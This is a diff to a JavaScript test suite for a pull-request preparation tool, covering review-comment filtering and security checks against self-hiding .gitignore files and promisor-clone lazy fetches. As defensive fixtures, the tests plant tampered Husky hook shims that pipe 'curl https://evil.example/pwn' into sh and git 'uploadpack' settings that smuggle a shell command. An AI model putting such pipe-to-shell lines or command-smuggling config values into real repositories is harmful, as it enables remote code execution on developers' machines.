@@ -19,6 +19,7 @@ import {
   renameSync,
   rmSync,
   symlinkSync,
+  unlinkSync,
   writeFileSync,
 } from 'node:fs';
 import { tmpdir } from 'node:os';
@@ -324,11 +325,44 @@ function reviewPages() {
       ],
     },
   });
+  const comments = {
+    totalCount: 105,
+    nodes: [
+      {
+        createdAt: '2026-11-01T01:30:00Z',
+        updatedAt: '2026-11-01T01:35:00Z',
+        url: 'https://github.com/QwenLM/qwen-code/pull/42#issuecomment-101',
+        body: '**[P1]** Separate git-dir objects symlinked into `.qwen/tmp/` are deleted.',
+        author: { login: 'maintainer' },
+        authorAssociation: 'COLLABORATOR',
+        isMinimized: false,
+      },
+      {
+        createdAt: '2026-11-01T01:40:00Z',
+        updatedAt: '2026-11-01T01:40:00Z',
+        url: 'https://github.com/QwenLM/qwen-code/pull/42#issuecomment-102',
+        body: 'Minimized old note **[P1]**',
+        author: { login: 'colleague' },
+        authorAssociation: 'MEMBER',
+        isMinimized: true,
+      },
+      {
+        createdAt: '2026-11-01T01:45:00Z',
+        updatedAt: '2026-11-01T01:45:00Z',
+        url: 'https://github.com/QwenLM/qwen-code/pull/42#issuecomment-103',
+        body: '**[P0]** Drive-by comment from non-maintainer',
+        author: { login: 'outsider' },
+        authorAssociation: 'NONE',
+        isMinimized: false,
+      },
+    ],
+  };
   const page = (nodes, hasNextPage) => ({
     data: {
       repository: {
         pullRequest: {
           latestOpinionatedReviews: opinionated,
+          comments,
           reviewThreads: {
             pageInfo: { hasNextPage, endCursor: hasNextPage ? 'c1' : 'c2' },
             nodes,
@@ -1457,6 +1491,19 @@ describe('reviewState', () => {
         body: 'Blocking: the retry drops the cursor.',
       },
     ]);
+    // Only non-minimized OWNER/MEMBER/COLLABORATOR top-level comments survive,
+    // while totalCount preserves whether `last: 100` truncated older comments.
+    expect(state.issueCommentCount).toBe(105);
+    expect(state.issueComments).toEqual([
+      {
+        author: 'maintainer',
+        association: 'COLLABORATOR',
+        createdAt: '2026-11-01T01:30:00Z',
+        updatedAt: '2026-11-01T01:35:00Z',
+        url: 'https://github.com/QwenLM/qwen-code/pull/42#issuecomment-101',
+        body: '**[P1]** Separate git-dir objects symlinked into `.qwen/tmp/` are deleted.',
+      },
+    ]);
   });
 
   // The stand-ins answer any query, so only GitHub can reject a field: a
@@ -1464,7 +1511,7 @@ describe('reviewState', () => {
   // text only after running the new query against a real PR.
   it('sends the query that was checked against the live API', () => {
     expect(REVIEW_STATE_QUERY).toBe(
-      'query($owner: String!, $name: String!, $number: Int!, $endCursor: String) { repository(owner: $owner, name: $name) { pullRequest(number: $number) { latestOpinionatedReviews(first: 100) { nodes { state submittedAt url body author { login } authorAssociation commit { oid } } } reviewThreads(first: 50, after: $endCursor) { pageInfo { hasNextPage endCursor } nodes { isResolved isOutdated path line originalLine comments(first: 50) { totalCount nodes { createdAt url body author { login } authorAssociation originalCommit { oid } pullRequestReview { url } } } } } } } }',
+      'query($owner: String!, $name: String!, $number: Int!, $endCursor: String) { repository(owner: $owner, name: $name) { pullRequest(number: $number) { latestOpinionatedReviews(first: 100) { nodes { state submittedAt url body author { login } authorAssociation commit { oid } } } comments(last: 100) { totalCount nodes { createdAt updatedAt url body author { login } authorAssociation isMinimized } } reviewThreads(first: 50, after: $endCursor) { pageInfo { hasNextPage endCursor } nodes { isResolved isOutdated path line originalLine comments(first: 50) { totalCount nodes { createdAt url body author { login } authorAssociation originalCommit { oid } pullRequestReview { url } } } } } } } }',
     );
   });
 
@@ -1479,8 +1526,10 @@ describe('reviewState', () => {
       {},
       [],
       [{ data: null }],
+      [{ data: { repository: { pullRequest: [] } } }],
       withPull({ reviewThreads: null }),
       withPull({ latestOpinionatedReviews: null }),
+      withPull({ comments: null }),
       withPull({
         reviewThreads: {
           ...pull.reviewThreads,
@@ -1488,6 +1537,7 @@ describe('reviewState', () => {
         },
       }),
       withPull({ reviewThreads: { ...pull.reviewThreads, nodes: [null] } }),
+      withPull({ reviewThreads: { ...pull.reviewThreads, nodes: [[]] } }),
       withPull({
         reviewThreads: {
           ...pull.reviewThreads,
@@ -1496,7 +1546,34 @@ describe('reviewState', () => {
           ],
         },
       }),
+      withPull({
+        reviewThreads: {
+          ...pull.reviewThreads,
+          nodes: [
+            { ...pull.reviewThreads.nodes[0], comments: { nodes: [[]] } },
+          ],
+        },
+      }),
       withPull({ latestOpinionatedReviews: { nodes: [null] } }),
+      withPull({ latestOpinionatedReviews: { nodes: [[]] } }),
+      withPull({ comments: { totalCount: 1, nodes: [null] } }),
+      withPull({ comments: { totalCount: 1, nodes: [[]] } }),
+      withPull({
+        comments: {
+          totalCount: 1,
+          nodes: [
+            {
+              createdAt: '2026-11-01T01:30:00Z',
+              updatedAt: '2026-11-01T01:30:00Z',
+              url: 'https://github.com/QwenLM/qwen-code/pull/42#issuecomment-1',
+              body: 'x',
+              author: [],
+              authorAssociation: 'COLLABORATOR',
+              isMinimized: false,
+            },
+          ],
+        },
+      }),
     ]) {
       expect(reviewState(pages)).toBeNull();
     }
@@ -1752,19 +1829,20 @@ describe.skipIf(process.platform === 'win32')(
       );
     });
 
-    it('rejects placeholder approval text before creating artifacts', () => {
-      for (const { execution, flag, value } of [
-        {
-          execution: 'host',
-          flag: '--reason',
-          value: '<why this round may run outside a boundary>',
-        },
-        {
-          execution: 'vm',
-          flag: '--attestation',
-          value: '<image, network policy, credential-free mount>',
-        },
-      ]) {
+    it.each([
+      {
+        execution: 'host',
+        flag: '--reason',
+        value: '<why this round may run outside a boundary>',
+      },
+      {
+        execution: 'vm',
+        flag: '--attestation',
+        value: '<image, network policy, credential-free mount>',
+      },
+    ])(
+      'rejects placeholder $execution $flag text before creating artifacts',
+      ({ execution, flag, value }) => {
         const { dir, base, head } = makeRepo();
         const prepared = command({ execution, trust: true, head });
         const args = [...prepared.artifactArgs];
@@ -1786,8 +1864,8 @@ describe.skipIf(process.platform === 'win32')(
         expect(result.stderr).toContain('execution approval:');
         expect(result.stderr).toContain('still carries a <placeholder>');
         expect(existsSync(join(dir, 'tmp'))).toBe(false);
-      }
-    });
+      },
+    );
 
     const failedRetryWitness = (trust) => {
       const { dir, base, head } = makeRepo();
@@ -2086,7 +2164,7 @@ describe.skipIf(process.platform === 'win32')(
       }
 
       if (redirected) {
-        rmSync(redirected.artifact);
+        unlinkSync(redirected.artifact);
         renameSync(redirected.original, redirected.artifact);
       }
       const control = runPrepare(dir, prepared.artifactArgs, env);
@@ -5321,306 +5399,325 @@ describe('trust classification and mandatory escalation (§4)', () => {
     );
   });
 
-  it('R6-2: refuses an untracked self-hiding root or nested .gitignore while allowing tracked .gitignore directories', () => {
-    const { dir, head } = makeRepo();
-    writeFileSync(join(dir, '.gitignore'), 'node_modules/\ntmp/\n');
-    execFileSync('git', ['add', '.gitignore'], { cwd: dir, env: gitEnv });
-    execFileSync('git', ['commit', '-qm', 'track root gitignore'], {
-      cwd: dir,
-      env: gitEnv,
+  describe('untracked ignore-file preflight (R6-2)', () => {
+    function makeTrackedGitignoreRepo() {
+      const { dir, head } = makeRepo();
+      writeFileSync(join(dir, '.gitignore'), 'node_modules/\ntmp/\n');
+      execFileSync('git', ['add', '.gitignore'], { cwd: dir, env: gitEnv });
+      execFileSync('git', ['commit', '-qm', 'track root gitignore'], {
+        cwd: dir,
+        env: gitEnv,
+      });
+      const trackedHead = execFileSync('git', ['rev-parse', 'HEAD'], {
+        cwd: dir,
+        env: gitEnv,
+        encoding: 'utf8',
+      }).trim();
+      return { dir, head, trackedHead };
+    }
+
+    it('allows legitimate tracked .gitignore directories including nested node_modules .gitignore', () => {
+      const { dir } = makeTrackedGitignoreRepo();
+      mkdirSync(join(dir, 'node_modules', 'pkg'), { recursive: true });
+      writeFileSync(join(dir, 'node_modules', 'pkg', '.gitignore'), '*\n');
+      mkdirSync(join(dir, 'tmp'), { recursive: true });
+      writeFileSync(join(dir, 'tmp', 'artifact.log'), 'ok\n');
+      expect(untrackedIgnoreSourceError(dir)).toBeNull();
     });
-    const trackedHead = execFileSync('git', ['rev-parse', 'HEAD'], {
-      cwd: dir,
-      env: gitEnv,
-      encoding: 'utf8',
-    }).trim();
 
-    // Legitimate ignored directories (including third-party .gitignore under node_modules) stay clean.
-    mkdirSync(join(dir, 'node_modules', 'pkg'), { recursive: true });
-    writeFileSync(join(dir, 'node_modules', 'pkg', '.gitignore'), '*\n');
-    mkdirSync(join(dir, 'tmp'), { recursive: true });
-    writeFileSync(join(dir, 'tmp', 'artifact.log'), 'ok\n');
-    expect(untrackedIgnoreSourceError(dir)).toBeNull();
+    it('refuses an untracked nested self-hiding .gitignore in library and CLI', () => {
+      const { dir, head, trackedHead } = makeTrackedGitignoreRepo();
+      mkdirSync(join(dir, 'sub'), { recursive: true });
+      writeFileSync(join(dir, 'sub', '.gitignore'), '*\n');
+      writeFileSync(join(dir, 'sub', 'hidden.txt'), 'secret\n');
+      const nestedErr = untrackedIgnoreSourceError(dir);
+      expect(nestedErr).toMatch(/untracked ignore files hide worktree entries/);
+      expect(nestedErr).toContain('sub/.gitignore');
 
-    // Untracked nested self-hiding .gitignore hides files from git status and must be refused.
-    mkdirSync(join(dir, 'sub'), { recursive: true });
-    writeFileSync(join(dir, 'sub', '.gitignore'), '*\n');
-    writeFileSync(join(dir, 'sub', 'hidden.txt'), 'secret\n');
-    const nestedErr = untrackedIgnoreSourceError(dir);
-    expect(nestedErr).toMatch(/untracked ignore files hide worktree entries/);
-    expect(nestedErr).toContain('sub/.gitignore');
-
-    // End-to-end prepare CLI must also refuse the clone with exit 3.
-    const fakeDir = mkdtempSync(join(tmpdir(), 'verify-pr-prepare-r62-'));
-    tmpDirs.push(fakeDir);
-    const snapFile = join(fakeDir, 'pr.json');
-    writeFileSync(
-      snapFile,
-      JSON.stringify({
-        number: 101,
-        title: 'R6-2 untracked gitignore test',
-        headRefOid: trackedHead,
-        baseRefOid: head,
-        headRefName: 'feat/r62',
-        baseRefName: 'main',
-        isCrossRepository: false,
-        author: { login: 'octocat' },
-        headRepository: { name: 'qwen-code' },
-        headRepositoryOwner: { login: 'QwenLM' },
-      }),
-    );
-    const fakeBin = join(fakeDir, 'bin');
-    mkdirSync(fakeBin, { recursive: true });
-    writeFileSync(
-      join(fakeBin, 'gh'),
-      [
-        '#!/bin/sh',
-        'if [ "$1" = pr ] && [ "$2" = view ]; then cat "$FAKE_SNAP"; exit 0; fi',
-        'if [ "$1" = api ] && [ "$2" = user ]; then printf \'{"login":"octocat"}\\n\'; exit 0; fi',
-        'if [ "$1" = api ] && [ "$2" = graphql ]; then printf \'{"data":{"repository":{"pullRequest":{"reviewThreads":{"nodes":[],"pageInfo":{"hasNextPage":false,"endCursor":null}},"reviews":{"nodes":[],"pageInfo":{"hasNextPage":false,"endCursor":null}}}}}}\\n\'; exit 0; fi',
-        'printf \'{"permission":"admin"}\\n\'',
-        '',
-      ].join('\n'),
-      { mode: 0o755 },
-    );
-    const envWithGh = {
-      ...process.env,
-      ...gitEnv,
-      FAKE_SNAP: snapFile,
-      PATH: `${fakeBin}:${process.env.PATH ?? ''}`,
-    };
-    const rNested = runPrepare(
-      dir,
-      ['101', '--repo', REPO, '--local-owner'],
-      envWithGh,
-    );
-    expect(rNested.status).toBe(3);
-    expect(rNested.stderr).toContain('sub/.gitignore');
-    expect(rNested.stderr).toContain('git clean -xfd');
-
-    // Leading `:` pathspec-magic directories (`:tmp/`, `:(top)foo/`) cannot spoof tracked `.gitignore`.
-    rmSync(join(dir, 'sub'), { recursive: true, force: true });
-    mkdirSync(join(dir, ':tmp'), { recursive: true });
-    writeFileSync(join(dir, ':tmp', '.gitignore'), '*\n');
-    writeFileSync(join(dir, ':tmp', 'evil.js'), 'pwn\n');
-    const colonTmpErr = untrackedIgnoreSourceError(dir);
-    expect(colonTmpErr).toMatch(/untracked ignore files hide worktree entries/);
-    expect(colonTmpErr).toContain(':tmp/.gitignore');
-    rmSync(join(dir, ':tmp'), { recursive: true, force: true });
-
-    mkdirSync(join(dir, ':(top)foo'), { recursive: true });
-    writeFileSync(join(dir, ':(top)foo', '.gitignore'), '*\n');
-    writeFileSync(join(dir, ':(top)foo', 'evil.js'), 'pwn\n');
-    const colonTopErr = untrackedIgnoreSourceError(dir);
-    expect(colonTopErr).toMatch(/untracked ignore files hide worktree entries/);
-    expect(colonTopErr).toContain(':(top)foo/.gitignore');
-    rmSync(join(dir, ':(top)foo'), { recursive: true, force: true });
-
-    // Husky v9's generated `.husky/_/` shim directory is allowed when `.husky/` is tracked and clean,
-    // but any extra file or modified hook shim inside `.husky/_/` is refused.
-    mkdirSync(join(dir, '.husky', '_'), { recursive: true });
-    writeFileSync(join(dir, '.husky', 'pre-commit'), 'npm run lint\n');
-    execFileSync('git', ['add', '.husky/pre-commit'], {
-      cwd: dir,
-      env: gitEnv,
+      const fakeDir = mkdtempSync(join(tmpdir(), 'verify-pr-prepare-r62-'));
+      tmpDirs.push(fakeDir);
+      const snapFile = join(fakeDir, 'pr.json');
+      writeFileSync(
+        snapFile,
+        JSON.stringify({
+          number: 101,
+          title: 'R6-2 untracked gitignore test',
+          headRefOid: trackedHead,
+          baseRefOid: head,
+          headRefName: 'feat/r62',
+          baseRefName: 'main',
+          isCrossRepository: false,
+          author: { login: 'octocat' },
+          headRepository: { name: 'qwen-code' },
+          headRepositoryOwner: { login: 'QwenLM' },
+        }),
+      );
+      const fakeBin = join(fakeDir, 'bin');
+      mkdirSync(fakeBin, { recursive: true });
+      writeFileSync(
+        join(fakeBin, 'gh'),
+        [
+          '#!/bin/sh',
+          'if [ "$1" = pr ] && [ "$2" = view ]; then cat "$FAKE_SNAP"; exit 0; fi',
+          'if [ "$1" = api ] && [ "$2" = user ]; then printf \'{"login":"octocat"}\\n\'; exit 0; fi',
+          'if [ "$1" = api ] && [ "$2" = graphql ]; then printf \'{"data":{"repository":{"pullRequest":{"reviewThreads":{"nodes":[],"pageInfo":{"hasNextPage":false,"endCursor":null}},"reviews":{"nodes":[],"pageInfo":{"hasNextPage":false,"endCursor":null}}}}}}\\n\'; exit 0; fi',
+          'printf \'{"permission":"admin"}\\n\'',
+          '',
+        ].join('\n'),
+        { mode: 0o755 },
+      );
+      const envWithGh = {
+        ...process.env,
+        ...gitEnv,
+        FAKE_SNAP: snapFile,
+        PATH: `${fakeBin}:${process.env.PATH ?? ''}`,
+      };
+      const rNested = runPrepare(
+        dir,
+        ['101', '--repo', REPO, '--local-owner'],
+        envWithGh,
+      );
+      expect(rNested.status).toBe(3);
+      expect(rNested.stderr).toContain('sub/.gitignore');
+      expect(rNested.stderr).toContain('git clean -xfd');
     });
-    execFileSync('git', ['commit', '-qm', 'track husky hook'], {
-      cwd: dir,
-      env: gitEnv,
-    });
-    writeFileSync(join(dir, '.husky', '_', '.gitignore'), '*\n');
-    writeFileSync(
-      join(dir, '.husky', '_', 'pre-commit'),
-      '#!/usr/bin/env sh\n. "$(dirname "$0")/h"\n',
+
+    it.each([':tmp', ':(top)foo'])(
+      'refuses untracked .gitignore inside pathspec-magic directory %s',
+      (magicDir) => {
+        const { dir } = makeTrackedGitignoreRepo();
+        mkdirSync(join(dir, magicDir), { recursive: true });
+        writeFileSync(join(dir, magicDir, '.gitignore'), '*\n');
+        writeFileSync(join(dir, magicDir, 'evil.js'), 'pwn\n');
+        const err = untrackedIgnoreSourceError(dir);
+        expect(err).toMatch(/untracked ignore files hide worktree entries/);
+        expect(err).toContain(`${magicDir}/.gitignore`);
+      },
     );
-    writeFileSync(
-      join(dir, '.husky', '_', 'h'),
-      readFileSync(
+
+    it('allows clean Husky v9 .husky/_/ shim directory and refuses extra or tampered files', () => {
+      const { dir } = makeTrackedGitignoreRepo();
+      const huskyH = readFileSync(
         fileURLToPath(
           new URL('../../node_modules/husky/husky', import.meta.url),
         ),
         'utf8',
-      ),
-    );
-    expect(untrackedIgnoreSourceError(dir)).toBeNull();
+      );
+      mkdirSync(join(dir, '.husky', '_'), { recursive: true });
+      writeFileSync(join(dir, '.husky', 'pre-commit'), 'npm run lint\n');
+      execFileSync('git', ['add', '.husky/pre-commit'], {
+        cwd: dir,
+        env: gitEnv,
+      });
+      execFileSync('git', ['commit', '-qm', 'track husky hook'], {
+        cwd: dir,
+        env: gitEnv,
+      });
+      writeFileSync(join(dir, '.husky', '_', '.gitignore'), '*\n');
+      writeFileSync(
+        join(dir, '.husky', '_', 'pre-commit'),
+        '#!/usr/bin/env sh\n. "$(dirname "$0")/h"\n',
+      );
+      writeFileSync(join(dir, '.husky', '_', 'h'), huskyH);
+      expect(untrackedIgnoreSourceError(dir)).toBeNull();
 
-    writeFileSync(join(dir, '.husky', '_', 'evil.js'), 'pwn\n');
-    expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
-    rmSync(join(dir, '.husky', '_', 'evil.js'));
-    writeFileSync(
-      join(dir, '.husky', '_', 'pre-commit'),
-      '#!/usr/bin/env sh\necho pwned\n',
-    );
-    expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
-    writeFileSync(
-      join(dir, '.husky', '_', 'pre-commit'),
-      '#!/usr/bin/env sh\n. "$(dirname "$0")/h"\n',
-    );
-    writeFileSync(
-      join(dir, '.husky', '_', 'h'),
-      '#!/usr/bin/env sh\ncurl https://evil.example/pwn | sh\n',
-    );
-    expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
-    writeFileSync(
-      join(dir, '.husky', '_', 'h'),
-      readFileSync(
-        fileURLToPath(
-          new URL('../../node_modules/husky/husky', import.meta.url),
-        ),
-        'utf8',
-      ),
-    );
-    writeFileSync(
-      join(dir, '.husky', '_', 'husky.sh'),
-      '#!/usr/bin/env sh\ncurl https://evil.example/pwn2 | sh\n',
-    );
-    expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
+      writeFileSync(join(dir, '.husky', '_', 'evil.js'), 'pwn\n');
+      expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
+      rmSync(join(dir, '.husky', '_', 'evil.js'));
 
-    // Root untracked self-hiding .gitignore in a repo without a tracked .gitignore must also be refused.
-    const { dir: dir2 } = makeRepo();
-    execFileSync('git', ['rm', '-qf', '.gitignore'], {
-      cwd: dir2,
-      env: gitEnv,
+      writeFileSync(
+        join(dir, '.husky', '_', 'pre-commit'),
+        '#!/usr/bin/env sh\necho pwned\n',
+      );
+      expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
+      writeFileSync(
+        join(dir, '.husky', '_', 'pre-commit'),
+        '#!/usr/bin/env sh\n. "$(dirname "$0")/h"\n',
+      );
+
+      writeFileSync(
+        join(dir, '.husky', '_', 'h'),
+        '#!/usr/bin/env sh\ncurl https://evil.example/pwn | sh\n',
+      );
+      expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
+      writeFileSync(join(dir, '.husky', '_', 'h'), huskyH);
+
+      writeFileSync(
+        join(dir, '.husky', '_', 'husky.sh'),
+        '#!/usr/bin/env sh\ncurl https://evil.example/pwn2 | sh\n',
+      );
+      expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
     });
-    execFileSync('git', ['commit', '-qm', 'remove tracked gitignore'], {
-      cwd: dir2,
-      env: gitEnv,
+
+    it('refuses an untracked self-hiding root .gitignore when none is tracked', () => {
+      const { dir } = makeRepo();
+      execFileSync('git', ['rm', '-qf', '.gitignore'], {
+        cwd: dir,
+        env: gitEnv,
+      });
+      execFileSync('git', ['commit', '-qm', 'remove tracked gitignore'], {
+        cwd: dir,
+        env: gitEnv,
+      });
+      writeFileSync(join(dir, '.gitignore'), '*\n');
+      writeFileSync(join(dir, 'hidden-a.txt'), 'secret\n');
+      const rootErr = untrackedIgnoreSourceError(dir);
+      expect(rootErr).toMatch(/untracked ignore files hide worktree entries/);
+      expect(rootErr).toContain('.gitignore');
     });
-    writeFileSync(join(dir2, '.gitignore'), '*\n');
-    writeFileSync(join(dir2, 'hidden-a.txt'), 'secret\n');
-    const rootErr = untrackedIgnoreSourceError(dir2);
-    expect(rootErr).toMatch(/untracked ignore files hide worktree entries/);
-    expect(rootErr).toContain('.gitignore');
   });
 
-  it('R7-2: probes --no-lazy-fetch capability and refuses promisor clones on git < 2.45 with upgrade remedy', () => {
-    const { dir: promDir, base: promBase, head: promHead } = makeRepo();
-    const marker = join(promDir, 'r72-uploadpack-fired');
-    execFileSync(
-      'git',
-      ['-C', promDir, 'config', '--local', 'core.repositoryformatversion', '1'],
-      { env: gitEnv, stdio: 'pipe' },
-    );
-    execFileSync(
-      'git',
-      ['-C', promDir, 'config', '--local', 'extensions.partialclone', 'origin'],
-      { env: gitEnv, stdio: 'pipe' },
-    );
-    execFileSync(
-      'git',
-      ['-C', promDir, 'config', '--local', 'remote.origin.promisor', 'true'],
-      { env: gitEnv, stdio: 'pipe' },
-    );
-    execFileSync(
-      'git',
-      [
-        '-C',
-        promDir,
-        'config',
-        '--local',
-        'remote.origin.uploadpack',
-        `touch ${marker}; false`,
-      ],
-      { env: gitEnv, stdio: 'pipe' },
-    );
-    expect(hasPromisorCloneConfig(promDir)).toBe(true);
+  describe('promisor lazy-fetch capability gate on git < 2.45 (R7-2)', () => {
+    function makeOldGitStub() {
+      const stubDir = mkdtempSync(join(tmpdir(), 'verify-pr-prepare-r72-'));
+      tmpDirs.push(stubDir);
+      const realGit = execFileSync(
+        process.platform === 'win32' ? 'where' : 'which',
+        ['git'],
+        { encoding: 'utf8' },
+      )
+        .trim()
+        .split(/\r?\n/)[0];
+      const stubBin = join(stubDir, 'bin');
+      mkdirSync(stubBin, { recursive: true });
+      writeFileSync(
+        join(stubBin, 'git'),
+        [
+          '#!/bin/sh',
+          'for arg in "$@"; do',
+          '  if [ "$arg" = "--no-lazy-fetch" ]; then',
+          '    echo "unknown option: --no-lazy-fetch" >&2',
+          '    exit 129',
+          '  fi',
+          'done',
+          'if [ "$1" = "--version" ]; then',
+          '  echo "git version 2.43.0"',
+          '  exit 0',
+          'fi',
+          'unset GIT_NO_LAZY_FETCH',
+          'exec "$REAL_GIT" "$@"',
+          '',
+        ].join('\n'),
+        { mode: 0o755 },
+      );
+      return { realGit, stubBin };
+    }
 
-    // Stub git reporting 2.43.0 and rejecting --no-lazy-fetch (exit 129),
-    // delegating all other invocations to the real git binary.
-    const stubDir = mkdtempSync(join(tmpdir(), 'verify-pr-prepare-r72-'));
-    tmpDirs.push(stubDir);
-    const realGit = execFileSync(
-      process.platform === 'win32' ? 'where' : 'which',
-      ['git'],
-      { encoding: 'utf8' },
-    )
-      .trim()
-      .split(/\r?\n/)[0];
-    const stubBin = join(stubDir, 'bin');
-    mkdirSync(stubBin, { recursive: true });
-    writeFileSync(
-      join(stubBin, 'git'),
-      [
-        '#!/bin/sh',
-        'for arg in "$@"; do',
-        '  if [ "$arg" = "--no-lazy-fetch" ]; then',
-        '    echo "unknown option: --no-lazy-fetch" >&2',
-        '    exit 129',
-        '  fi',
-        'done',
-        'if [ "$1" = "--version" ]; then',
-        '  echo "git version 2.43.0"',
-        '  exit 0',
-        'fi',
-        'unset GIT_NO_LAZY_FETCH',
-        'exec "$REAL_GIT" "$@"',
-        '',
-      ].join('\n'),
-      { mode: 0o755 },
-    );
-    const fakeGhEnv = installFakeGh(
-      snapshotFor({ base: promBase, head: promHead }),
-    );
-    const envWithOldGit = {
-      ...fakeGhEnv,
-      ...gitEnv,
-      REAL_GIT: realGit,
-      PATH: `${stubBin}:${fakeGhEnv.PATH ?? process.env.PATH ?? ''}`,
-    };
-    const res = runPrepare(promDir, ['42', '--repo', REPO], envWithOldGit);
-    expect(res.status).toBe(3);
-    expect(res.stderr).toContain('2.43.0');
-    expect(res.stderr).toContain('git >= 2.45');
-    expect(existsSync(marker)).toBe(false);
+    it('refuses a standard promisor clone on git < 2.45 without firing uploadpack', () => {
+      const { dir: promDir, base: promBase, head: promHead } = makeRepo();
+      const marker = join(promDir, 'r72-uploadpack-fired');
+      execFileSync(
+        'git',
+        [
+          '-C',
+          promDir,
+          'config',
+          '--local',
+          'core.repositoryformatversion',
+          '1',
+        ],
+        { env: gitEnv, stdio: 'pipe' },
+      );
+      execFileSync(
+        'git',
+        [
+          '-C',
+          promDir,
+          'config',
+          '--local',
+          'extensions.partialclone',
+          'origin',
+        ],
+        { env: gitEnv, stdio: 'pipe' },
+      );
+      execFileSync(
+        'git',
+        ['-C', promDir, 'config', '--local', 'remote.origin.promisor', 'true'],
+        { env: gitEnv, stdio: 'pipe' },
+      );
+      execFileSync(
+        'git',
+        [
+          '-C',
+          promDir,
+          'config',
+          '--local',
+          'remote.origin.uploadpack',
+          `touch ${marker}; false`,
+        ],
+        { env: gitEnv, stdio: 'pipe' },
+      );
+      expect(hasPromisorCloneConfig(promDir)).toBe(true);
 
-    // Non-UTF-8 remote subsection names (`[remote "a\xffb"] promisor = true`)
-    // must also be caught at the raw-byte level rather than failing open.
-    const {
-      dir: rawPromDir,
-      base: rawPromBase,
-      head: rawPromHead,
-    } = makeRepo();
-    const rawMarker = join(rawPromDir, 'r72-nonutf8-uploadpack-fired');
-    const rawCfgPath = join(rawPromDir, '.git', 'config');
-    writeFileSync(
-      rawCfgPath,
-      Buffer.concat([
-        readFileSync(rawCfgPath),
-        Buffer.from('\n[remote "a'),
-        Buffer.from([0xff]),
-        Buffer.from(
-          `b"]\n\turl = file:///nonexistent\n\tpromisor = true\n\tuploadpack = touch ${rawMarker}; false\n`,
-        ),
-      ]),
-    );
-    expect(hasPromisorCloneConfig(rawPromDir)).toBe(true);
-    const rawFakeGhEnv = installFakeGh(
-      snapshotFor({ base: rawPromBase, head: rawPromHead }),
-    );
-    const rawRes = runPrepare(rawPromDir, ['42', '--repo', REPO], {
-      ...rawFakeGhEnv,
-      ...gitEnv,
-      REAL_GIT: realGit,
-      PATH: `${stubBin}:${rawFakeGhEnv.PATH ?? process.env.PATH ?? ''}`,
+      const { realGit, stubBin } = makeOldGitStub();
+      const fakeGhEnv = installFakeGh(
+        snapshotFor({ base: promBase, head: promHead }),
+      );
+      const res = runPrepare(promDir, ['42', '--repo', REPO], {
+        ...fakeGhEnv,
+        ...gitEnv,
+        REAL_GIT: realGit,
+        PATH: `${stubBin}:${fakeGhEnv.PATH ?? process.env.PATH ?? ''}`,
+      });
+      expect(res.status).toBe(3);
+      expect(res.stderr).toContain('2.43.0');
+      expect(res.stderr).toContain('git >= 2.45');
+      expect(existsSync(marker)).toBe(false);
     });
-    expect(rawRes.status).toBe(3);
-    expect(rawRes.stderr).toContain('git >= 2.45');
-    expect(existsSync(rawMarker)).toBe(false);
 
-    // Ordinary non-promisor clones remain allowed end-to-end even when git < 2.45.
-    const { dir: fullDir, base: fullBase, head: fullHead } = makeRepo();
-    expect(hasPromisorCloneConfig(fullDir)).toBe(false);
-    expect(typeof gitSupportsNoLazyFetch()).toBe('boolean');
-    expect(promisorLazyFetchHardeningError(fullDir)).toBeNull();
-    const fullFakeGhEnv = installFakeGh(
-      snapshotFor({ base: fullBase, head: fullHead }),
-    );
-    const fullRes = runPrepare(fullDir, ['42', '--repo', REPO], {
-      ...fullFakeGhEnv,
-      ...gitEnv,
-      REAL_GIT: realGit,
-      PATH: `${stubBin}:${fullFakeGhEnv.PATH ?? process.env.PATH ?? ''}`,
+    it('refuses a non-UTF-8 remote subsection promisor clone on git < 2.45 at raw-byte level', () => {
+      const {
+        dir: rawPromDir,
+        base: rawPromBase,
+        head: rawPromHead,
+      } = makeRepo();
+      const rawMarker = join(rawPromDir, 'r72-nonutf8-uploadpack-fired');
+      const rawCfgPath = join(rawPromDir, '.git', 'config');
+      writeFileSync(
+        rawCfgPath,
+        Buffer.concat([
+          readFileSync(rawCfgPath),
+          Buffer.from('\n[remote "a'),
+          Buffer.from([0xff]),
+          Buffer.from(
+            `b"]\n\turl = file:///nonexistent\n\tpromisor = true\n\tuploadpack = touch ${rawMarker}; false\n`,
+          ),
+        ]),
+      );
+      expect(hasPromisorCloneConfig(rawPromDir)).toBe(true);
+
+      const { realGit, stubBin } = makeOldGitStub();
+      const rawFakeGhEnv = installFakeGh(
+        snapshotFor({ base: rawPromBase, head: rawPromHead }),
+      );
+      const rawRes = runPrepare(rawPromDir, ['42', '--repo', REPO], {
+        ...rawFakeGhEnv,
+        ...gitEnv,
+        REAL_GIT: realGit,
+        PATH: `${stubBin}:${rawFakeGhEnv.PATH ?? process.env.PATH ?? ''}`,
+      });
+      expect(rawRes.status).toBe(3);
+      expect(rawRes.stderr).toContain('git >= 2.45');
+      expect(existsSync(rawMarker)).toBe(false);
     });
-    expect(fullRes.status).toBe(0);
+
+    it('allows ordinary non-promisor clones end-to-end when git < 2.45', () => {
+      const { dir: fullDir, base: fullBase, head: fullHead } = makeRepo();
+      expect(hasPromisorCloneConfig(fullDir)).toBe(false);
+      expect(typeof gitSupportsNoLazyFetch()).toBe('boolean');
+      expect(promisorLazyFetchHardeningError(fullDir)).toBeNull();
+
+      const { realGit, stubBin } = makeOldGitStub();
+      const fullFakeGhEnv = installFakeGh(
+        snapshotFor({ base: fullBase, head: fullHead }),
+      );
+      const fullRes = runPrepare(fullDir, ['42', '--repo', REPO], {
+        ...fullFakeGhEnv,
+        ...gitEnv,
+        REAL_GIT: realGit,
+        PATH: `${stubBin}:${fullFakeGhEnv.PATH ?? process.env.PATH ?? ''}`,
+      });
+      expect(fullRes.status).toBe(0);
+    });
   });
 });
